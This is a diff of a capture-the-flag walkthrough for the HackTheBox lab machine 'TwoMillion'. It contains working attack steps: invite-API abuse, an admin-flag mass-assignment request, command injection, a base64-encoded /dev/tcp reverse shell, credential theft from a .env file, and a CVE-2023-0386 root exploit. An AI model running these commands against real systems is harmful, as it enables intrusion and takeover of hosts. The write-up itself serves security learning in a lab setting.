@@ -6,26 +6,46 @@ os: linux
 pwnDate: 2024-03-03
 releaseDate: 2023-06-07
 slug: "two-million"
-isPublished: false
+isPublished: true
 shareLink: https://www.hackthebox.com/achievement/machine/701907/547
 ---
 
+import Browser from "@/components/Browser.astro" 
+
 ## Enumeration
 
+[(command explanation)](https://explainshell.com/explain?cmd=nmap+-p-+-n+-Pn+--disable-arp-ping+-sS+-sV+-sC+-vvv+-T5+10.10.11.221+-oN+twoMillion)
 ```bash
-nmap -p- -n -Pn --disable-arp-ping -sS -sV -sC -vvv -T5 10.10.11.221 -oN twoMillion.nmap
+sudo nmap -p- -n -Pn --disable-arp-ping -sS -sV -sC -vvv -T5 10.10.11.221 -oN twoMillion
 
 PORT   STATE SERVICE REASON         VERSION
 22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
 80/tcp open  http    syn-ack ttl 63 nginx
 ```
 
+The scan shows ports 22 (SSH) and 80 (Nginx) open, with port 80 redirecting to the domain [2million.htb](http://2million.htb) , so let's add this vHost to our /etc/hosts file
+
 ```bash
 echo "10.10.11.221 2million.htb" | sudo tee -a /etc/hosts
 ```
 
+<Browser
+  url="2million.htb"
+  src="/walkthroughs/two-million/0.png"
+/>
+
+Once we access the vHost identified above we see the old version of the HackTheBox website.
+
+After clicking on the join button in the navbar, we go to the join section and clicking on the "Join HTB" button we get to a [registration form](http://2million.htb/invite) where we are asked for an invitation code.
+
+<Browser
+  url="2million.htb"
+  src="/walkthroughs/two-million/1.png"
+/>
+
+By inspecting the page we see the following scripts. The second function seems to be called when the submit button is pressed and sends a `POST` request to `/api/v1/invite/verify` to check if the provided code is valid or not.
+
 ```html
-<script src="/js/htb-frontend.min.js"></script>
 <script defer src="/js/inviteapi.min.js"></script>
 <script defer>
 	$(document).ready(function() {
@@ -55,6 +75,8 @@ echo "10.10.11.221 2million.htb" | sudo tee -a /etc/hosts
 	});
 </script>
 ```
+
+On the other hand, there is also a script called `inviteapi.min.js` that once we deobfuscated its content using the following [tool](https://lelinhtinh.github.io/de4js) we get the following content.
 
 ```javascript
 function verifyInviteCode(code) {
@@ -90,78 +112,113 @@ function makeInviteCode() {
 }
 ```
 
+as we can see we have 2 new endpoints:
+- /api/v1/invite/verify
+- /api/v1/invite/how/to/generate
+
+By name they seem to be of some interest since one of them seems to tell us how to generate the code we are asked to generate.
+
+
+Next, I am making the requests listed below and applying the corrections indicated by the API in the response messages
+
 ```bash
 curl -sX POST http://2million.htb/api/v1/invite/how/to/generate | jq
+# curl -sX POST http://2million.htb/api/v1/invite/how/to/generate | jq '.data.data'
+```
+
+```bash
+echo "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+In order to generate the invite code, make a POST request to /api/v1/invite/generate
 ```
 
 ```bash
 curl -sX POST http://2million.htb/api/v1/invite/generate | jq
+# curl -sX POST http://2million.htb/api/v1/invite/generate | jq '.data.code'
 ```
 
 ```bash
 echo U1oyN0ktUTVaOVMtREtOSVgtUDNDU00= | base64 -d
 
-2GK8M-R6Q5F-3PSE1-3F6VO
+SZ27I-Q5Z9S-DKNIX-P3CSM
 ```
 
-```txt
-GET /api/v1/user/vpn/generate HTTP/1.1
-Host: 2million.htb
-User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
-Accept:
-text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: http://2million.htb/home/access
-DNT: 1
-Connection: close
-Cookie: PHPSESSID=nufb0km8892s1t9kraqhqiecj6
-Upgrade-Insecure-Requests: 1
-```
+<Browser
+  url="2million.htb/register"
+  src="/walkthroughs/two-million/2.png"
+/>
 
-```bash
-curl -v 2million.htb/api
-```
+register and access the app
 
-```bash
-curl -sv 2million.htb/api --cookie "PHPSESSID=cp7u0jf33357c8jjb5k9v4m0ir" | jq
-```
+<Browser
+  url="2million.htb/home"
+  src="/walkthroughs/two-million/3.png"
+/>
 
-```bash
-curl http://2million.htb/api/v1/admin/auth --cookie "PHPSESSID=eovcsv8bn94rokcpvu0to86hro" | jq
-```
+On [`/home/access`](http://2million.htb/home/access), we find some buttons that allow us to generate credentials for a vpn that if we look closely are making requests to these endpoints:
+- http://2million.htb/api/v1/user/vpn/generate
+- http://2million.htb/api/v1/user/vpn/regenerate
 
-```bash
-curl -sv -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=eovcsv8bn94rokcpvu0to86hro"
-```
-
-```bash
-curl -svX PUT http://2million.htb/api/v1/admin/settings/update --cookie
-"PHPSESSID=eovcsv8bn94rokcpvu0to86hro" | jq
-```
 
 ```json
-curl -sX PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=eovcsv8bn94rokcpvu0to86hro" --header "Content-Type: application/json" | jq 
+curl -s 2million.htb/api --cookie "PHPSESSID=8864c6dup3a2r6a4hq73natc45" | jq
 
 {
-  "status": "danger",
-  "message": "Missing parameter: email"
+  "/api/v1": "Version 1 of the API"
 }
 ```
 
 ```json
-curl -sX PUT http://2million.htb/api/v1/admin/settings/update --cookie
-"PHPSESSID=eovcsv8bn94rokcpvu0to86hro" --header "Content-Type: application/json" --data '{"email":"example@2million.htb"}' | jq 
+curl -s 2million.htb/api/v1 --cookie "PHPSESSID=8864c6dup3a2r6a4hq73natc45" | jq
 
 {
-  "status": "danger",
-  "message": "Missing parameter: is_admin"
+  "v1": {
+    "user": {
+      "GET": {
+        "/api/v1": "Route List",
+        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
+        "/api/v1/invite/generate": "Generate invite code",
+        "/api/v1/invite/verify": "Verify invite code",
+        "/api/v1/user/auth": "Check if user is authenticated",
+        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
+        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
+        "/api/v1/user/vpn/download": "Download OVPN file"
+      },
+      "POST": {
+        "/api/v1/user/register": "Register a new user",
+        "/api/v1/user/login": "Login with existing user"
+      }
+    },
+    "admin": {
+      "GET": {
+        "/api/v1/admin/auth": "Check if user is admin"
+      },
+      "POST": {
+        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
+      },
+      "PUT": {
+        "/api/v1/admin/settings/update": "Update user settings"
+      }
+    }
+  }
 }
 ```
 
+```bash
+curl -s http://2million.htb/api/v1/admin/auth --cookie "PHPSESSID=8864c6dup3a2r6a4hq73natc45" | jq
+
+{
+  "message": false
+}
+```
+
+```bash
+curl -svX POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=8864c6dup3a2r6a4hq73natc45"
+
+HTTP/1.1 401 Unauthorized
+```
+
 ```json
-curl -sX PUT http://2million.htb/api/v1/admin/settings/update --cookie
-"PHPSESSID=eovcsv8bn94rokcpvu0to86hro" --header "Content-Type: application/json" --data '{"email":"example@2million.htb", "is_admin": 1}' | jq
+curl -sX PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=8864c6dup3a2r6a4hq73natc45" --header "Content-Type: application/json" --data '{"email":"example@2million.htb", "is_admin": 1}' | jq
 
 {
   "id": 13,
@@ -172,19 +229,9 @@ curl -sX PUT http://2million.htb/api/v1/admin/settings/update --cookie
 
 ## Foothold
 
-```
-curl -sX POST http://2million.htb/api/v1/admin/vpn/generate --cookie
-"PHPSESSID=eovcsv8bn94rokcpvu0to86hro" --header "Content-Type: application/json" | jq
 
-{
-"status": "danger",
-"message": "Missing parameter: username"
-}
-```
-
-```
-curl -sX POST http://2million.htb/api/v1/admin/vpn/generate --cookie
-"PHPSESSID=eovcsv8bn94rokcpvu0to86hro" --header "Content-Type: application/json" --data '{"username":"test"}'
+```json
+curl -sX POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=8864c6dup3a2r6a4hq73natc45" --header "Content-Type: application/json" --data '{"username":"test"}'
 
 client
 dev tun
@@ -208,58 +255,43 @@ MIIGADCCA+igAwIBAgIUQxzHkNyCAfHzUuoJgKZwCwVNjgIwDQYJKoZIhvcNAQEL
 <SNIP>
 ```
 
+we try to see if it allows command injection by means of the payload `;id;` and we see that it does work
+
 ```
-curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=nufb0km8892s1t9kraqhqiecj6" --header "Content-Type: application/json" --data '{"username":"test;id;"}'
+curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=8864c6dup3a2r6a4hq73natc45" --header "Content-Type: application/json" --data '{"username":"test;id;"}'
 
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
+
+Next, we prepare our reverse shell and proceed to enter the machine.
 
 ```
 nc -lnvp 5000
 ```
 
 ```
-sh -i >& /dev/tcp/10.10.14.37/5000 0>&1
+sh -i >& /dev/tcp/10.10.14.63/5000 0>&1
+```
+
+as we see that it doesn't work like that, we proceed to encode it in base64
+
+```
+echo "sh -i >& /dev/tcp/10.10.14.63/5000 0>&1" | base64
+
+c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjMvNTAwMCAwPiYxCg==
 ```
 
 ```
-echo "sh -i >& /dev/tcp/10.10.14.37/5000 0>&1" | base64
-
-c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMzcvNTAwMCAwPiYxCg==
-```
-
-```
-curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie
-"PHPSESSID=eovcsv8bn94rokcpvu0to86hro" --header "Content-Type: application/json" --data '{"username":"test;echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMzcvNTAwMCAwPiYxCg== | base64 -d | bash;"}'
+curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=8864c6dup3a2r6a4hq73natc45" --header "Content-Type: application/json" --data '{"username":"test;echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjMvNTAwMCAwPiYxCg== | base64 -d | bash;"}'
 ```
 
 ## Post Exploitation
 
-```bash
-script /dev/null -c bash
-```
-
-`ctrl+z`
-
-<br/>
-
-```bash
-stty raw -echo; fg
-```
-
-<br/>
-
-```bash
-reset xterm
-```
-
-<br/>
-
-```bash
-export TERM=xterm
-```
+once inside we proceed to upgrade our shell following [hacktricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys#script) guide. 
 
 ## Lateral Movement
+
+Once inside we are as the user `www-data` and as we can see, we are in `/var/www/html`. we list the files with `ls -la` and we see a file `.env`
 
 ```
 www-data@2million:/var/www/html$ cat .env
@@ -277,6 +309,8 @@ admin:x:1000:1000::/home/admin:/bin/bash
 memcache:x:115:121:Memcached,,,:/nonexistent:/bin/false
 ```
 
+Then, using these previously acquired credentials `admin:SuperDuperPass123`, we proceed to ssh to the machine using the following command
+
 ```bash
 ssh admin@2million.htb
 ```
@@ -284,7 +318,7 @@ ssh admin@2million.htb
 ```bash
 admin@2million:~$ cat user.txt 
 
-5eb46ff7e6bb1c5e71ac52aeaefeb814
+73bd321e003fd32a400fb9fd433ff93b
 ```
 
 ## Privilege Escalation
@@ -333,21 +367,37 @@ cd /tmp/CVE-2023-0386/
 make all
 ```
 
+In a terminal inside the victim machine we execute the following
+
 ```bash
 ./fuse ./ovlcap/lower ./gc &
 [+] len of gc: 0x3ee0
 [1] 6153
 ```
 
+and in another we execute this other
+
 ```bash
 ./exp
 ```
 
-```bash
-root@2million:~$ cat root.txt 
+automatically, our shell becomes root and we can proceed to read the flag
 
-************************
+```bash
+root@2million:/tmp/CVE-2023-0386# cat /root/root.txt
+
+23901cb02e587f40ab921ba2c9eaa3ad
 ```
 
 
 ## Extra
+
+In the root directory we found the file `thank_you.json`. To save you some time, I leave you the original content and the link to cyberchef with the [decrypted content](https://gchq.github.io/CyberChef/#recipe=URL_Decode(/disabled/breakpoint)From_Hex('Auto'/disabled/breakpoint)From_Base64('A-Za-z0-9%2B/%3D',true,false)XOR(%7B'option':'UTF8','string':'HackTheBox'%7D,'Standard',false)&input=REFRQ0dYUWdCQ0VFTENBRUlRUXNTQ1l0QWhVOUR3b2ZMVVJ2U0RnZGFBQVJEblFjRFRBR0ZDUUVCMHNnQjBVakFSWW5GQTBJTVVnRVlnSVhKUVFOSHpzZEZtSUNFU1FFRUI4N0JnQmlCaFpvRGhZWmRBSUtOeDBXTFJoREh6c1BBRFlISFRwUFF6dzlIQTFpQmhVbEJBMFlNVWdQTFJaWUtROEhTek1hQkRZR0REMEZCa2QwSHdCaURCMGtCQUVaTlJ3QVloc1FMVUVDQ0R3QkFEUUtGUzBQRjBzN0RrVXdDaGtyQ1FvRk0waFhZZ0lSSkEwS0JEcElGeWNDR1RvS0FnazREVVUzSEIwNkVrSkxBQUFNTVU4UkpnSVJEakFCQnk0S1dDNEVBaDkwSHdvM0F4eG9Ed3dmZEFBRU5BcFlLZ1FHQlhRWUNqRWNFU29OQmtzakFSRXFBQTA4UVFZS053QkZJd0VjYUFRVkRpWVJSUzBCSFdnT0JVc3RCeEJzWlhJT0V3d0dkQndOSjA4T0xSTWFTellOQWlzQkZpRVBCRWQwSUFRaEJDd2dCQ0VFTEVnTkl4eFlLZ1FHQlhRS0VDc0RER2dVRXdRNlNCRXFDbGdxQkE4Q01RNUZOZ2NaUEVFSUJUc2ZDU2NMSHkxQkVBTTFHZ3dzQ0ZSb0Fnd0hPQWtITFIwWlBBZ01CWGhJQkN3TFdDQUFEUThuUlFvc1R4MHdFUVlaUFEwTElRcFlLUk1HU3pJZEN5WU9GUzBQRndvNFNCRXRUd2d0RXhBRU9na0pZZzRXTEVFVEdUc09BREVjRVNjUEFnZDBEeGN0R0F3Z1QwTS9PdzhBTmdjZE9rMURIREZJRFNNWkhXZ0hEQmdnRFJjbkMxZ3BEME1PT2g0TU1BQVdKUVFOSDNRZkRTY2RIV2dJRFFVN0hnUTJCaGNtUVJjREpnRVRKeHhZS1E4SFN5Y0REQzREQzJnQUVRNTBBQW9zQ2h4bVFTWUtOd0JGSVFjWkpBMEdCVE1OUlNFQUZUZ05CaDh4REVsaUNoa3JDVU1HTlFzTkt3RWRhQUlNQlNVZEFEQUtIR1JCQWdVd1NBQTBDZ294UVJBQVBRUUpZZ01kS1JNTkRqQklEU01jV0NzT0RSOG1BUWMzR3gwc1FSY0VkQndOSjA4Ykp3MFBEamNjRERRS1dDRVBGdzQ0QkF3bENoWXJCRU1mUEFrUllna05MUTBRU3lBQURERlBEaUVERVFvNkhFVWhBQlVsRkEwQ0lCRkxTR1VzSjBFR0NqY0FSU01CSEdnRUZRNG1FVVV2Q2hVcUJCRkxPdzVGTmdjZGFDa0NDRDg4RFNjdEZ6QkJBQVE1QlJBc0Jnd3hUVU1mUEFrTEtVOEJKeFJERFRzYVJTQUtFU1lHUXdwMEdBUXdHMWduQjBNZlBBRVdZZ1lXS3hNR0R6MEtDU2RQRWljVUVRVXhFVXRpTmhjOUUwTUlPd1lSTUFZYVBSVUtCRG9iUlNvT0RpMUJFQU0xR0FBbVR3d2dCRU1kTVJvY1lna1pLaE1LQ0hRSEEySUFEVHBCRXdjMUhBTXRIUlZvQUEwUGRBRUxNUjhST2dRSFN5RWJSVFlBV0NzT0RSODlCaEFqQXhReFFRb0ZPZ2NUSXhzZGFBQU5EM1FORXkwRERpMVBRend4U0FRd0NsZ2hEQTRPT2hzQUxoWllPQk1NSGpCSUNpUlBEeUFBRjBzakRVVXFEZzR0UVFJSU53Y0lNZ01ST3drR0QzUWNDaVVLRENBRUVVZDBDUXNtVHc4dFFRWUtNdzBYTGhaWUtROFhBamNCRlNNYkhXZ1ZDdzUwQ3dvM0FRd2tCQkFZZEFVTUxnb0xQQTRORGlkSUhDY2JXRHdPUXdnN0JRQnNaWElBQkJFT2N4dEZOZ0JZUEFrR1N6b05IVFpQR3lBQUV4OHhHa2xpR0JBdEV3WkxJdzFGTlFZVUpFRUFCRG9jREN3YUhXZ1ZERXNrSFJZcVR3d2dCRU1KT3gwTEpnNEtJUVFRU3pzT1JTRVdHaTBURUE0M0hSY3JHd0ZrUVFvRkp4Z01NQXBZUEFrR1N6b05IVFpQSHkwUEJoazFIQXd0QVZnbkIwTU9JQUFNSVE0VWFBa0NDRDhORnpGRFdDa1BCMHMzR2dBakd4MW9BRU1jT3hvSkprOFBJQVFSRG5RREN5MFlGQzBGQkE1MEFSWmlEaHNyQkJBWVBRb0pKMDhNSjBFQ0J6aEdiMGc0RVR3SlF3OHhEUlVuSEF4b0JoRUtJQUVSTndzZFpHdHBQendOUlFvT0d5TTFDdzRXQngxaU94MHBEQT09).
+
+```bash
+root@2million:/root# cat thank_you.json
+
+{"encoding": "url", "data": "%7B%22encoding%22:%20%22hex%22,%20%22data%22:%20%227b22656e6372797074696f6e223a2022786f72222c2022656e6372707974696f6e5f6b6579223a20224861636b546865426f78222c2022656e636f64696e67223a2022626173653634222c202264617461223a20224441514347585167424345454c43414549515173534359744168553944776f664c5552765344676461414152446e51634454414746435145423073674230556a4152596e464130494d556745596749584a51514e487a7364466d494345535145454238374267426942685a6f4468595a6441494b4e7830574c526844487a73504144594848547050517a7739484131694268556c424130594d5567504c525a594b513848537a4d614244594744443046426b6430487742694442306b4241455a4e527741596873514c554543434477424144514b4653305046307337446b557743686b7243516f464d306858596749524a41304b424470494679634347546f4b41676b344455553348423036456b4a4c4141414d4d5538524a674952446a41424279344b574334454168393048776f334178786f44777766644141454e4170594b67514742585159436a456345536f4e426b736a41524571414130385151594b4e774246497745636141515644695952525330424857674f42557374427842735a58494f457777476442774e4a30384f4c524d61537a594e4169734246694550424564304941516842437767424345454c45674e497878594b6751474258514b45437344444767554577513653424571436c6771424138434d5135464e67635a50454549425473664353634c4879314245414d31476777734346526f416777484f416b484c52305a5041674d425868494243774c574341414451386e52516f73547830774551595a5051304c495170594b524d47537a49644379594f4653305046776f345342457454776774457841454f676b4a596734574c4545544754734f414445634553635041676430447863744741776754304d2f4f7738414e6763644f6b31444844464944534d5a48576748444267674452636e4331677044304d4f4f68344d4d4141574a51514e48335166445363644857674944515537486751324268636d515263444a6745544a7878594b5138485379634444433444433267414551353041416f734368786d5153594b4e7742464951635a4a41304742544d4e525345414654674e4268387844456c6943686b7243554d474e51734e4b7745646141494d425355644144414b48475242416755775341413043676f78515241415051514a59674d644b524d4e446a424944534d635743734f4452386d4151633347783073515263456442774e4a3038624a773050446a63634444514b57434550467734344241776c4368597242454d6650416b5259676b4e4c51305153794141444446504469454445516f36484555684142556c464130434942464c534755734a304547436a634152534d42484767454651346d45555576436855714242464c4f7735464e67636461436b434344383844536374467a424241415135425241734267777854554d6650416b4c4b5538424a785244445473615253414b4553594751777030474151774731676e42304d6650414557596759574b784d47447a304b435364504569635545515578455574694e68633945304d494f7759524d4159615052554b42446f6252536f4f4469314245414d314741416d5477776742454d644d526f6359676b5a4b684d4b4348514841324941445470424577633148414d744852566f414130506441454c4d5238524f67514853794562525459415743734f445238394268416a4178517851516f464f676354497873646141414e4433514e4579304444693150517a777853415177436c67684441344f4f6873414c685a594f424d4d486a424943695250447941414630736a4455557144673474515149494e7763494d674d524f776b47443351634369554b44434145455564304351736d547738745151594b4d7730584c685a594b513858416a634246534d62485767564377353043776f334151776b424241596441554d4c676f4c5041344e44696449484363625744774f51776737425142735a5849414242454f637874464e67425950416b47537a6f4e48545a504779414145783878476b6c694742417445775a4c497731464e5159554a45454142446f6344437761485767564445736b485259715477776742454d4a4f78304c4a67344b49515151537a734f525345574769305445413433485263724777466b51516f464a78674d4d41705950416b47537a6f4e48545a504879305042686b31484177744156676e42304d4f4941414d4951345561416b434344384e467a464457436b50423073334767416a4778316f41454d634f786f4a4a6b385049415152446e514443793059464330464241353041525a69446873724242415950516f4a4a30384d4a304543427a6847623067344554774a517738784452556e4841786f4268454b494145524e7773645a477470507a774e52516f4f47794d3143773457427831694f78307044413d3d227d%22%7D"}
+```
+
+> Dear HackTheBox Community,<br/><br/>We are thrilled to announce a momentous milestone in our journey together. With immense joy and gratitude, we celebrate the achievement of reaching 2 million remarkable users! This incredible feat would not have been possible without each and every one of you.<br/><br/> From the very beginning, HackTheBox has been built upon the belief that knowledge sharing, collaboration, and hands-on experience are fundamental to personal and professional growth. Together, we have fostered an environment where innovation thrives and skills are honed. Each challenge completed, each machine conquered, and every skill learned has contributed to the collective intelligence that fuels this vibrant community.<br/><br/> To each and every member of the HackTheBox community, thank you for being a part of this incredible journey. Your contributions have shaped the very fabric of our platform and inspired us to continually innovate and evolve. We are immensely proud of what we have accomplished together, and we eagerly anticipate the countless milestones yet to come.<br/><br/> Here's to the next chapter, where we will continue to push the boundaries of cybersecurity, inspire the next generation of ethical hackers, and create a world where knowledge is accessible to all.<br/><br/> With deepest gratitude,<br/><br/> The HackTheBox Team
